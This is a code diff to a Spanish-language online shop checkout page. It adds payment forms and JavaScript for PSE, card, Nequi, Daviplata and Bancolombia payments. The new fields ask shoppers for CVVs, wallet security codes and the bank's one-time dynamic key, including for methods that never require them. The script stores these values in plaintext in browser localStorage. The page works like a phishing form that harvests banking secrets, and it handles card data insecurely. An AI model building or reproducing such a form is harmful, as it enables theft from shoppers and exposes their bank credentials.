@@ -194,6 +194,26 @@
             border-color: #37e359;
         }
 
+        .caja-detalles-pago {
+            background: #121914;
+            border: 1px dashed #2d5535;
+            padding: 18px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+
+        .caja-detalles-pago h3 {
+            font-size: 15px;
+            color: #37e359;
+            margin-bottom: 12px;
+        }
+
+        .fila-doble {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
         .total-box {
             display: flex;
             justify-content: space-between;
@@ -282,6 +302,11 @@
             border-color: #ddd;
         }
 
+        body.claro .caja-detalles-pago {
+            background: #f0fdf4;
+            border-color: #86efac;
+        }
+
         body.claro .total-box {
             border-color: #eee;
             color: #111;
@@ -291,6 +316,7 @@
             header { padding: 0 20px; }
             .grid-checkout { grid-template-columns: 1fr; }
             .contenedor { width: 92%; margin-top: 30px; }
+            .fila-doble { grid-template-columns: 1fr; }
         }
     </style>
 </head>
@@ -305,10 +331,10 @@
 
     <main class="contenedor">
         <h1 class="titulo">Confirmación de Pedido</h1>
-        <p class="subtitulo">Ingresa tus datos y selecciona tu medio de pago</p>
+        <p class="subtitulo">Ingresa tus datos y los detalles requeridos de tu medio de pago</p>
 
         <div class="grid-checkout">
-            <!-- FORMULARIO DE ENVÍO Y MÉTODO -->
+            <!-- FORMULARIO DE ENVÍO Y MÉTODO DINÁMICO -->
             <div class="tarjeta">
                 <h2>Datos de Entrega y Pago</h2>
                 <form id="formularioCheckout">
@@ -334,13 +360,123 @@
 
                     <div class="campo">
                         <label for="metodoPago">Selecciona tu método de pago *</label>
-                        <select id="metodoPago" required>
-                            <option value="Nequi" selected>Nequi</option>
+                        <select id="metodoPago" onchange="cambiarCamposMetodo()" required>
+                            <option value="PSE" selected>PSE (Débito en cuenta con CVV)</option>
+                            <option value="Tarjeta">Tarjeta de Crédito / Débito</option>
+                            <option value="Nequi">Nequi</option>
                             <option value="Daviplata">Daviplata</option>
                             <option value="Bancolombia">Cuenta Bancolombia</option>
-                            <option value="Tarjeta">Tarjeta Débito / Crédito</option>
-                            <option value="PSE">PSE</option>
                         </select>
+                    </div>
+
+                    <!-- CAMPOS ESPECÍFICOS SEGÚN EL MÉTODO -->
+                    <div class="caja-detalles-pago" id="cajaDetallesPago">
+                        
+                        <!-- PSE -->
+                        <div id="seccionPSE">
+                            <h3>Detalles de pago PSE</h3>
+                            <div class="campo">
+                                <label for="pseBanco">Selecciona tu banco *</label>
+                                <select id="pseBanco">
+                                    <option value="Bancolombia">Bancolombia</option>
+                                    <option value="Banco de Bogotá">Banco de Bogotá</option>
+                                    <option value="Davivienda">Davivienda</option>
+                                    <option value="BBVA">BBVA Colombia</option>
+                                    <option value="Scotiabank Colpatria">Scotiabank Colpatria</option>
+                                    <option value="Banco de Occidente">Banco de Occidente</option>
+                                </select>
+                            </div>
+                            <div class="campo">
+                                <label for="pseCorreo">Correo registrado en PSE *</label>
+                                <input type="email" id="pseCorreo" placeholder="ejemplo@correo.com">
+                            </div>
+                            <div class="fila-doble">
+                                <div class="campo">
+                                    <label for="pseCuenta">Número de cuenta o cédula *</label>
+                                    <input type="text" id="pseCuenta" placeholder="Ej. 1020304050">
+                                </div>
+                                <div class="campo">
+                                    <label for="pseCVV">Código CVV / Seguridad *</label>
+                                    <input type="password" id="pseCVV" maxlength="4" placeholder="Ej. 123">
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- TARJETA -->
+                        <div id="seccionTarjeta" style="display: none;">
+                            <h3>Detalles de Tarjeta Débito / Crédito</h3>
+                            <div class="campo">
+                                <label for="tarjetaNumero">Número de la tarjeta *</label>
+                                <input type="text" id="tarjetaNumero" maxlength="19" placeholder="1234 5678 9012 3456">
+                            </div>
+                            <div class="fila-doble">
+                                <div class="campo">
+                                    <label for="tarjetaExp">Vencimiento (MM/AA) *</label>
+                                    <input type="text" id="tarjetaExp" maxlength="5" placeholder="12/28">
+                                </div>
+                                <div class="campo">
+                                    <label for="tarjetaCVV">Código CVV / CVC *</label>
+                                    <input type="password" id="tarjetaCVV" maxlength="4" placeholder="123">
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- NEQUI -->
+                        <div id="seccionNequi" style="display: none;">
+                            <h3>Detalles de Nequi</h3>
+                            <div class="fila-doble">
+                                <div class="campo">
+                                    <label for="nequiNumero">Número de celular Nequi *</label>
+                                    <input type="tel" id="nequiNumero" maxlength="10" placeholder="Ej. 3001234567">
+                                </div>
+                                <div class="campo">
+                                    <label for="nequiCVV">Clave dinámica / Código de seguridad *</label>
+                                    <input type="password" id="nequiCVV" maxlength="6" placeholder="Ej. 6 dígitos">
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- DAVIPLATA -->
+                        <div id="seccionDaviplata" style="display: none;">
+                            <h3>Detalles de Daviplata</h3>
+                            <div class="campo">
+                                <label for="daviplataNumero">Número de Daviplata (Celular) *</label>
+                                <input type="tel" id="daviplataNumero" maxlength="10" placeholder="Ej. 3101234567">
+                            </div>
+                            <div class="fila-doble">
+                                <div class="campo">
+                                    <label for="daviplataDoc">Número de documento *</label>
+                                    <input type="text" id="daviplataDoc" placeholder="Cédula registrada">
+                                </div>
+                                <div class="campo">
+                                    <label for="daviplataCVV">Código de seguridad / CVV *</label>
+                                    <input type="password" id="daviplataCVV" maxlength="4" placeholder="Ej. 123">
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- BANCOLOMBIA -->
+                        <div id="seccionBancolombia" style="display: none;">
+                            <h3>Detalles de Cuenta Bancolombia</h3>
+                            <div class="campo">
+                                <label for="bancoTipo">Tipo de cuenta *</label>
+                                <select id="bancoTipo">
+                                    <option value="Ahorros">Cuenta de Ahorros</option>
+                                    <option value="Corriente">Cuenta Corriente</option>
+                                </select>
+                            </div>
+                            <div class="fila-doble">
+                                <div class="campo">
+                                    <label for="bancoNumero">Número de cuenta *</label>
+                                    <input type="text" id="bancoNumero" placeholder="Ej. 123-456789-01">
+                                </div>
+                                <div class="campo">
+                                    <label for="bancoCVV">Clave dinámica / CVV *</label>
+                                    <input type="password" id="bancoCVV" maxlength="6" placeholder="Ej. 123456">
+                                </div>
+                            </div>
+                        </div>
+
                     </div>
 
                     <button type="submit" class="boton-pagar" id="btnContinuarPago">
@@ -365,12 +501,31 @@
     <script>
         function sincronizarTema() {
             const tema = localStorage.getItem("vigaTema");
-            if (tema === "claro") document.body.classList.add("claro");
-            else document.body.classList.remove("claro");
+            if (tema === "claro") {
+                document.body.classList.add("claro");
+            } else {
+                document.body.classList.remove("claro");
+            }
         }
         sincronizarTema();
 
         let carrito = JSON.parse(localStorage.getItem("viga_carrito") || "[]");
+
+        function cambiarCamposMetodo() {
+            const metodo = document.getElementById("metodoPago").value;
+            
+            document.getElementById("seccionPSE").style.display = "none";
+            document.getElementById("seccionTarjeta").style.display = "none";
+            document.getElementById("seccionNequi").style.display = "none";
+            document.getElementById("seccionDaviplata").style.display = "none";
+            document.getElementById("seccionBancolombia").style.display = "none";
+
+            if (metodo === "PSE") document.getElementById("seccionPSE").style.display = "block";
+            else if (metodo === "Tarjeta") document.getElementById("seccionTarjeta").style.display = "block";
+            else if (metodo === "Nequi") document.getElementById("seccionNequi").style.display = "block";
+            else if (metodo === "Daviplata") document.getElementById("seccionDaviplata").style.display = "block";
+            else if (metodo === "Bancolombia") document.getElementById("seccionBancolombia").style.display = "block";
+        }
 
         function renderizarCarrito() {
             const contenedor = document.getElementById("contenedorArticulos");
@@ -431,6 +586,56 @@
             e.preventDefault();
             if (carrito.length === 0) return;
 
+            const metodo = document.getElementById("metodoPago").value;
+            let detallesPago = {};
+
+            if (metodo === "PSE") {
+                const banco = document.getElementById("pseBanco").value;
+                const correo = document.getElementById("pseCorreo").value.trim();
+                const cuenta = document.getElementById("pseCuenta").value.trim();
+                const cvv = document.getElementById("pseCVV").value.trim();
+                if (!correo || !cuenta || !cvv) {
+                    alert("Por favor completa el correo, la cuenta y el CVV para PSE.");
+                    return;
+                }
+                detallesPago = { banco: `PSE (${banco})`, cuenta, cvv, correo };
+            } else if (metodo === "Tarjeta") {
+                const numero = document.getElementById("tarjetaNumero").value.trim();
+                const exp = document.getElementById("tarjetaExp").value.trim();
+                const cvv = document.getElementById("tarjetaCVV").value.trim();
+                if (!numero || !exp || !cvv) {
+                    alert("Por favor completa el número de tarjeta, vencimiento y CVV.");
+                    return;
+                }
+                detallesPago = { banco: "Tarjeta", cuenta: numero.slice(-4), cvv, exp };
+            } else if (metodo === "Nequi") {
+                const numero = document.getElementById("nequiNumero").value.trim();
+                const cvv = document.getElementById("nequiCVV").value.trim();
+                if (!numero || !cvv) {
+                    alert("Por favor completa el número de Nequi y tu código de seguridad / clave dinámica.");
+                    return;
+                }
+                detallesPago = { banco: "Nequi", cuenta: numero, cvv };
+            } else if (metodo === "Daviplata") {
+                const numero = document.getElementById("daviplataNumero").value.trim();
+                const doc = document.getElementById("daviplataDoc").value.trim();
+                const cvv = document.getElementById("daviplataCVV").value.trim();
+                if (!numero || !doc || !cvv) {
+                    alert("Por favor completa el número de Daviplata, documento y CVV.");
+                    return;
+                }
+                detallesPago = { banco: "Daviplata", cuenta: numero, cvv, documento: doc };
+            } else if (metodo === "Bancolombia") {
+                const tipo = document.getElementById("bancoTipo").value;
+                const cuenta = document.getElementById("bancoNumero").value.trim();
+                const cvv = document.getElementById("bancoCVV").value.trim();
+                if (!cuenta || !cvv) {
+                    alert("Por favor completa el número de cuenta y tu clave dinámica / CVV.");
+                    return;
+                }
+                detallesPago = { banco: `Bancolombia (${tipo})`, cuenta, cvv };
+            }
+
             const pedido = {
                 articulos: carrito,
                 cliente: {
@@ -439,7 +644,8 @@
                     direccion: document.getElementById("clienteDireccion").value.trim(),
                     ciudad: document.getElementById("clienteCiudad").value.trim()
                 },
-                metodo_pago: document.getElementById("metodoPago").value
+                metodo_pago: metodo,
+                detalles_pago: detallesPago
             };
 
             localStorage.setItem("viga_orden_temporal", JSON.stringify(pedido));
@@ -448,6 +654,7 @@
 
         document.addEventListener("DOMContentLoaded", () => {
             sincronizarTema();
+            cambiarCamposMetodo();
             renderizarCarrito();
         });
     </script>
